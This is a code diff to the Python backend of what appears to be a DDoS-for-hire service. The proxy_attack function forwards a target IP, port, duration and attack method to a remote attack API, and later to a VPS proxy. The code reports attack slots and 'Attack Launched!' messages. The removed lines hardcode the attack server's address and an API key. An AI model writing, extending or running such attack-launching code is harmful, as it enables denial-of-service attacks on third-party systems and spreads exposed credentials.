@@ -232,62 +232,36 @@ def encrypted_reply(data_dict):
 
 def proxy_attack(ip, port, time_sec):
     """
-    Forward attack request to VK API.
-    GET http://API_HOST/vk/launch?key=API_KEY&ip=X&port=Y&time=Z&method=METHOD
-    API itself tracks and returns slots (active/available/max).
+    Forward attack request to VPS proxy — single request, STUN method.
     """
     try:
-        api_host = os.getenv('ATTACK_API_BASE', 'http://3.110.174.225:3030')
-        api_key = os.getenv('ATTACK_API_KEY', 'vk_oQuXhkua_5CAxfsa-lqiYHLi7zSn_y8a')
-        method = os.getenv('ATTACK_METHOD', 'VISHAL')
-
-        url = f"{api_host}/vk/launch?key={api_key}&ip={ip}&port={port}&time={time_sec}&method={method}"
-        r = requests.get(url, timeout=15)
-
+        payload = {
+            "secret": PROXY_SECRET,
+            "ip": ip,
+            "port": port,
+            "time": time_sec,
+            "method": PROXY_METHOD,
+        }
+        r = requests.post(PROXY_URL, json=payload, timeout=15)
         if r.status_code == 200:
             data = r.json()
-            if data.get("success") or data.get("status") == "queued":
+            if data.get("status") == "queued":
+                launched = data.get("launchedCount", 1)
                 return {
                     "status": "queued",
-                    "message": data.get("message", "\u26a1 Attack Launched!"),
+                    "message": data.get("message", "⚡ Attack Launched!"),
                     "target": f"{ip}:{port}",
-                    "method": method,
-                    "time": int(time_sec),
-                    "slots": data.get("slots", {"active": 0, "available": 10, "max": 10}),
+                    "method": PROXY_METHOD,
+                    "slots": {"active": launched, "available": max(8 - launched, 0), "max": 8},
                 }
             return {"status": "error", "message": data.get("message", "Attack failed")}
-        else:
-            try:
-                data = r.json()
-                msg = data.get("message", data.get("error", f"API returned {r.status_code}"))
-            except Exception:
-                msg = f"API returned {r.status_code}"
-            return {"status": "error", "message": msg}
-
+        return {"status": "error", "message": f"Proxy returned {r.status_code}"}
     except Exception as e:
-        return {"status": "error", "message": f"Connection failed: {str(e)}"}
+        return {"status": "error", "message": str(e)}
 
 def proxy_status():
-    """Check VK API /vk/slots for LIVE slot info — all users see real-time data."""
-    try:
-        api_host = os.getenv('ATTACK_API_BASE', 'http://3.110.174.225:3030')
-        api_key = os.getenv('ATTACK_API_KEY', 'vk_oQuXhkua_5CAxfsa-lqiYHLi7zSn_y8a')
-        url = f"{api_host}/vk/slots?key={api_key}"
-        r = requests.get(url, timeout=8)
-        if r.status_code == 200:
-            data = r.json()
-            return {
-                "status": "online",
-                "slots": {
-                    "active": data.get("active", 0),
-                    "available": data.get("available", 10),
-                    "max": data.get("max_slots", 10)
-                }
-            }
-        return {"status": "online", "slots": {"active": 0, "available": 10, "max": 10}}
-    except Exception:
-        return {"status": "offline", "slots": {"active": 0, "available": 0, "max": 10}}
-
+    """Simple online check"""
+    return {"status": "online"}
 
 def sign_response(expires_at, device_id):
     msg = "{}|{}".format(expires_at or "", device_id or "")
